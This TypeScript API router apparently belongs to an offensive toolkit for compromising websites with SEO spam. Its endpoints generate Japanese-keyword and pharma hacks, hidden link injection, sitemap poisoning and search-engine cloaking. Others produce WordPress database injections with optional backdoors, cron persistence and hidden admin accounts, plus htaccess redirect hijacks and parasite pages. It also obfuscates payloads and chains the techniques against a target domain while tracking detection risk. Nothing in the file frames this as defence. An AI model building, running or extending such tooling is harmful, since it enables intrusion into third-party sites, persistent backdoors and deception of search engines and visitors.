/**
 * Hacked SEO Spam Router — API endpoints for Hacked SEO Spam techniques
 *
 * Endpoints:
 * - getHackTechniques: List all hack techniques with details
 * - getHackTechniqueDetail: Get specific technique info
 * - generateJapaneseHack: Generate Japanese keyword hack payloads
 * - generatePharmaHack: Generate pharma hack payloads
 * - generateGibberishHack: Generate gibberish content hack
 * - generateDoorwayPages: Generate doorway page sets
 * - generateLinkInjection: Generate hidden link injection payloads
 * - generateSitemapPoison: Generate sitemap poisoning payloads
 * - generateCloaking: Generate conditional cloaking payloads
 * - generateWPDbInjection: Generate WordPress DB injection payloads
 * - generateHtaccessHijack: Generate .htaccess redirect hijack
 * - generateParasiteNest: Generate parasite page nesting structure
 * - obfuscatePayload: Obfuscate any payload code
 * - runHackedChain: Run full hacked SEO spam chain (multi-technique)
 */
import { z } from "zod";
import { superadminProcedure, router } from "../_core/trpc";
import {
  getHackTechniques,
  getHackTechniqueById,
  generateJapaneseKeywordHack,
  generatePharmaHack,
  generateGibberishHack,
  generateDoorwayPages,
  generateLinkInjection,
  generateSitemapPoison,
  generateConditionalCloaking,
  generateWPDbInjection,
  generateHtaccessHijack,
  generateParasiteNest,
  obfuscatePayload,
  runHackedSeoSpamChain,
  type HackType,
} from "../hacked-seo-spam-engine";

const hackTypeEnum = z.enum([
  "japanese_keyword", "pharma_hack", "gibberish_hack", "doorway_pages",
  "link_injection", "sitemap_poisoning", "conditional_cloaking",
  "wp_db_injection", "htaccess_hijack", "parasite_nesting",
]);

export const hackedSeoSpamRouter = router({
  // ── List all techniques ──
  getHackTechniques: superadminProcedure
    .input(z.object({ category: z.string().optional() }).optional())
    .query(({ input }) => {
      return getHackTechniques(input?.category);
    }),

  // ── Get specific technique detail ──
  getHackTechniqueDetail: superadminProcedure
    .input(z.object({ id: hackTypeEnum }))
    .query(({ input }) => {
      const technique = getHackTechniqueById(input.id);
      if (!technique) throw new Error(`Technique ${input.id} not found`);
      return technique;
    }),

  // ── Japanese Keyword Hack ──
  generateJapaneseHack: superadminProcedure
    .input(z.object({
      targetDomain: z.string().min(1),
      redirectUrl: z.string().url(),
      pageCount: z.number().min(1).max(500).optional(),
      keywords: z.array(z.string()).optional(),
      includeProducts: z.boolean().optional(),
      enableCloaking: z.boolean().optional(),
    }))
    .mutation(({ input }) => {
      const result = generateJapaneseKeywordHack(input.targetDomain, input.redirectUrl, {
        pageCount: input.pageCount,
        keywords: input.keywords,
        includeProducts: input.includeProducts,
        enableCloaking: input.enableCloaking,
      });
      return {
        totalPages: result.totalPages,
        sitemapEntries: result.sitemapEntries.length,
        cloakingEnabled: !!result.cloakingScript,
        keywords: result.keywords.length,
        pages: result.pages.slice(0, 5).map(p => ({
          slug: p.slug,
          title: p.title,
          keywords: p.keywords,
          cloaked: p.cloaked,
          bodyPreview: p.body.slice(0, 200),
        })),
        cloakingScript: result.cloakingScript ? result.cloakingScript.slice(0, 500) + "..." : null,
        sitemapXml: `<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n${result.sitemapEntries.slice(0, 5).join("\n")}\n<!-- ... ${result.sitemapEntries.length - 5} more entries -->\n</urlset>`,
        generatedAt: result.generatedAt.toISOString(),
        fullPayload: result,
      };
    }),

  // ── Pharma Hack ──
  generatePharmaHack: superadminProcedure
    .input(z.object({
      targetDomain: z.string().min(1),
      redirectUrl: z.string().url(),
      enableCloaking: z.boolean().optional(),
      injectionMethod: z.enum(["header", "footer", "db", "all"]).optional(),
    }))
    .mutation(({ input }) => {
      const result = generatePharmaHack(input.targetDomain, input.redirectUrl, {
        enableCloaking: input.enableCloaking,
        injectionMethod: input.injectionMethod,
      });
      return {
        products: result.products.length,
        keywords: result.keywords.length,
        injectionCodePreview: result.injectionCode.slice(0, 300) + "...",
        cloakingEnabled: !!result.cloakingPHP,
        headerInjectionPreview: result.headerInjection.slice(0, 300) + "...",
        footerInjectionPreview: result.footerInjection.slice(0, 300) + "...",
        dbInjectionPreview: result.dbInjection.slice(0, 300) + "...",
        generatedAt: result.generatedAt.toISOString(),
        fullPayload: result,
      };
    }),

  // ── Gibberish Hack ──
  generateGibberishHack: superadminProcedure
    .input(z.object({
      targetDomain: z.string().min(1),
      redirectUrl: z.string().url(),
      pageCount: z.number().min(1).max(200).optional(),
      keywords: z.array(z.string()).optional(),
    }))
    .mutation(({ input }) => {
      const result = generateGibberishHack(input.targetDomain, input.redirectUrl, {
        pageCount: input.pageCount,
        keywords: input.keywords,
      });
      return {
        totalPages: result.totalPages,
        sitemapEntries: result.sitemapEntries.length,
        pages: result.pages.slice(0, 5).map(p => ({
          slug: p.slug,
          title: p.title,
          keywords: p.keywords,
          bodyPreview: p.body.slice(0, 200),
        })),
        fullPayload: result,
      };
    }),

  // ── Doorway Pages ──
  generateDoorwayPages: superadminProcedure
    .input(z.object({
      targetDomain: z.string().min(1),
      redirectUrl: z.string().url(),
      keywords: z.array(z.string()).min(1),
      pagesPerKeyword: z.number().min(1).max(20).optional(),
      language: z.enum(["th", "en", "ja"]).optional(),
      enableInterlinks: z.boolean().optional(),
      enableSchema: z.boolean().optional(),
      enableDelayedRedirect: z.boolean().optional(),
    }))
    .mutation(async ({ input }) => {
      const result = await generateDoorwayPages(input.targetDomain, input.redirectUrl, input.keywords, {
        pagesPerKeyword: input.pagesPerKeyword,
        language: input.language,
        enableInterlinks: input.enableInterlinks,
        enableSchema: input.enableSchema,
        enableDelayedRedirect: input.enableDelayedRedirect,
      });
      return {
        id: result.id,
        totalPages: result.totalPages,
        targetKeywords: result.targetKeywords.length,
        interlinkCount: result.interlinkStructure.length,
        pages: result.pages.slice(0, 5).map(p => ({
          slug: p.slug,
          title: p.title,
          keywords: p.keywords,
          internalLinks: p.internalLinks.length,
          hasSchema: !!p.schema,
          hasRedirect: !!p.redirectScript,
        })),
        sitemapPreview: result.sitemapXml.slice(0, 500) + "...",
        generatedAt: result.generatedAt.toISOString(),
        fullPayload: result,
      };
    }),

  // ── Link Injection ──
  generateLinkInjection: superadminProcedure
    .input(z.object({
      redirectUrl: z.string().url(),
      keywords: z.array(z.string()).min(1),
      linkCount: z.number().min(1).max(100).optional(),
      methods: z.array(z.enum(["css_offscreen", "css_transparent", "css_tiny", "js_dynamic", "noscript", "overflow_hidden"])).optional(),
      includeJsInjector: z.boolean().optional(),
      includePhpInjector: z.boolean().optional(),
    }))
    .mutation(({ input }) => {
      const result = generateLinkInjection(input.redirectUrl, input.keywords, {
        linkCount: input.linkCount,
        methods: input.methods,
        includeJsInjector: input.includeJsInjector,
        includePhpInjector: input.includePhpInjector,
      });
      return {
        totalLinks: result.totalLinks,
        anchorDistribution: result.anchorDistribution,
        links: result.hiddenLinks.slice(0, 10).map(l => ({
          anchor: l.anchor,
          method: l.hideMethod,
          htmlPreview: l.htmlSnippet.slice(0, 150),
        })),
        cssHideMethod: result.cssHideMethod,
        hasJsInjector: !!result.jsInjector,
        hasPhpInjector: !!result.phpInjector,
        fullPayload: result,
      };
    }),

  // ── Sitemap Poisoning ──
  generateSitemapPoison: superadminProcedure
    .input(z.object({
      targetDomain: z.string().min(1),
      spamUrls: z.array(z.string().url()).min(1),
      includeRobotsTxt: z.boolean().optional(),
      includePingUrls: z.boolean().optional(),
      originalSitemap: z.string().optional(),
    }))
    .mutation(({ input }) => {
      const result = generateSitemapPoison(input.targetDomain, input.spamUrls, {
        includeRobotsTxt: input.includeRobotsTxt,
        includePingUrls: input.includePingUrls,
        originalSitemap: input.originalSitemap,
      });
      return {
        injectedUrls: result.injectedUrls.length,
        poisonedSitemapPreview: result.poisonedSitemap.slice(0, 500) + "...",
        robotsTxtModification: result.robotsTxtModification,
        pingUrls: result.pingUrls,
        fullPayload: result,
      };
    }),

  // ── Conditional Cloaking ──
  generateCloaking: superadminProcedure
    .input(z.object({
      redirectUrl: z.string().url(),
      spamContent: z.string().min(1),
      normalContent: z.string().optional(),
      enablePhp: z.boolean().optional(),
      enableJs: z.boolean().optional(),
      enableHtaccess: z.boolean().optional(),
      enableNginx: z.boolean().optional(),
    }))
    .mutation(({ input }) => {
      const result = generateConditionalCloaking(input.redirectUrl, input.spamContent, {
        normalContent: input.normalContent,
        enablePhp: input.enablePhp,
        enableJs: input.enableJs,
        enableHtaccess: input.enableHtaccess,
        enableNginx: input.enableNginx,
      });
      return {
        phpCloakerPreview: result.phpCloaker ? result.phpCloaker.slice(0, 400) + "..." : null,
        jsCloakerPreview: result.jsCloaker ? result.jsCloaker.slice(0, 400) + "..." : null,
        htaccessPreview: result.htaccessRules ? result.htaccessRules.slice(0, 400) + "..." : null,
        nginxPreview: result.nginxRules ? result.nginxRules.slice(0, 400) + "..." : null,
        botUserAgents: result.botUserAgents.length,
        searchEngineIPs: result.searchEngineIPs.length,
        fullPayload: result,
      };
    }),

  // ── WordPress Database Injection ──
  generateWPDbInjection: superadminProcedure
    .input(z.object({
      targetDomain: z.string().min(1),
      redirectUrl: z.string().url(),
      keywords: z.array(z.string()).min(1),
      postCount: z.number().min(1).max(100).optional(),
      includeBackdoor: z.boolean().optional(),
      includeCronJob: z.boolean().optional(),
      includeHiddenAdmin: z.boolean().optional(),
    }))
    .mutation(({ input }) => {
      const result = generateWPDbInjection(input.targetDomain, input.redirectUrl, input.keywords, {
        postCount: input.postCount,
        includeBackdoor: input.includeBackdoor,
        includeCronJob: input.includeCronJob,
        includeHiddenAdmin: input.includeHiddenAdmin,
      });
      return {
        sqlQueriesCount: result.sqlQueries.length,
        wpPostsPreview: result.wpPostsInjection.slice(0, 400) + "...",
        wpOptionsPreview: result.wpOptionsInjection.slice(0, 400) + "...",
        wpTermsPreview: result.wpTermsInjection.slice(0, 400) + "...",
        hasPluginBackdoor: !!result.pluginBackdoor,
        hasThemeBackdoor: !!result.themeBackdoor,
        hasCronJob: !!result.cronJobInjection,
        fullPayload: result,
      };
    }),

  // ── .htaccess Redirect Hijack ──
  generateHtaccessHijack: superadminProcedure
    .input(z.object({
      redirectUrl: z.string().url(),
      enableRefererRedirect: z.boolean().optional(),
      enableUserAgentRedirect: z.boolean().optional(),
      enableIpRules: z.boolean().optional(),
      enableTimeBasedRules: z.boolean().optional(),
      whitelistIPs: z.array(z.string()).optional(),
    }))
    .mutation(({ input }) => {
      const result = generateHtaccessHijack(input.redirectUrl, {
        enableRefererRedirect: input.enableRefererRedirect,
        enableUserAgentRedirect: input.enableUserAgentRedirect,
        enableIpRules: input.enableIpRules,
        enableTimeBasedRules: input.enableTimeBasedRules,
        whitelistIPs: input.whitelistIPs,
      });
      return {
        rulesPreview: result.rules.slice(0, 500) + "...",
        hasConditionalRedirects: !!result.conditionalRedirects,
        hasIpRules: !!result.ipBasedRules,
        hasRefererRules: !!result.refererBasedRules,
        fullPayload: result,
      };
    }),

  // ── Parasite Page Nesting ──
  generateParasiteNest: superadminProcedure
    .input(z.object({
      targetDomain: z.string().min(1),
      redirectUrl: z.string().url(),
      keywords: z.array(z.string()).min(1),
      nestDepth: z.number().min(1).max(5).optional(),
      pagesPerDir: z.number().min(1).max(20).optional(),
      directoryPrefix: z.string().optional(),
      enableHtaccess: z.boolean().optional(),
    }))
    .mutation(({ input }) => {
      const result = generateParasiteNest(input.targetDomain, input.redirectUrl, input.keywords, {
        nestDepth: input.nestDepth,
        pagesPerDir: input.pagesPerDir,
        directoryPrefix: input.directoryPrefix,
        enableHtaccess: input.enableHtaccess,
      });
      return {
        totalPages: result.totalPages,
        nestDepth: result.nestDepth,
        directories: result.directoryStructure.length,
        htaccessFiles: result.htaccessFiles.length,
        indexFiles: result.indexFiles.slice(0, 5).map(f => ({
          path: f.path,
          contentPreview: f.content.slice(0, 200),
        })),
        sitemapPreview: result.sitemapFile.slice(0, 500) + "...",
        fullPayload: result,
      };
    }),

  // ── Payload Obfuscation ──
  obfuscatePayload: superadminProcedure
    .input(z.object({
      payload: z.string().min(1),
      method: z.enum(["base64", "hex", "rot13", "multi_layer", "variable_substitution"]).optional(),
    }))
    .mutation(({ input }) => {
      const result = obfuscatePayload(input.payload, input.method || "multi_layer");
      return {
        obfuscated: result,
        method: input.method || "multi_layer",
        originalLength: input.payload.length,
        obfuscatedLength: result.length,
      };
    }),

  // ── Run Full Hacked SEO Spam Chain ──
  runHackedChain: superadminProcedure
    .input(z.object({
      targetDomain: z.string().min(1),
      redirectUrl: z.string().url(),
      hackTypes: z.array(hackTypeEnum).min(1),
      keywords: z.array(z.string()).optional(),
      language: z.enum(["th", "en", "ja"]).optional(),
      pageCount: z.number().min(1).max(500).optional(),
      enableCloaking: z.boolean().optional(),
      enablePersistence: z.boolean().optional(),
      enableObfuscation: z.boolean().optional(),
    }))
    .mutation(async ({ input }) => {
      const results = await runHackedSeoSpamChain(
        input.targetDomain,
        input.redirectUrl,
        input.hackTypes,
        input.keywords || [],
        {
          language: input.language,
          pageCount: input.pageCount,
          enableCloaking: input.enableCloaking,
          enablePersistence: input.enablePersistence,
          enableObfuscation: input.enableObfuscation,
        },
      );

      const totalPages = results.reduce((sum, r) => sum + r.pagesCreated, 0);
      const totalLinks = results.reduce((sum, r) => sum + r.linksInjected, 0);
      const totalRedirects = results.reduce((sum, r) => sum + r.redirectsSetup, 0);
      const successCount = results.filter(r => r.success).length;
      const totalElapsed = results.reduce((sum, r) => sum + r.elapsed, 0);

      return {
        summary: {
          totalTechniques: results.length,
          successCount,
          failedCount: results.length - successCount,
          totalPagesCreated: totalPages,
          totalLinksInjected: totalLinks,
          totalRedirectsSetup: totalRedirects,
          totalElapsed,
        },
        results: results.map(r => ({
          hackType: r.hackType,
          success: r.success,
          pagesCreated: r.pagesCreated,
          linksInjected: r.linksInjected,
          redirectsSetup: r.redirectsSetup,
          cloakingEnabled: r.cloakingEnabled,
          persistenceEnabled: r.persistenceEnabled,
          detectionRisk: r.detectionRisk,
          elapsed: r.elapsed,
          error: r.error,
        })),
        fullResults: results,
      };
    }),
});
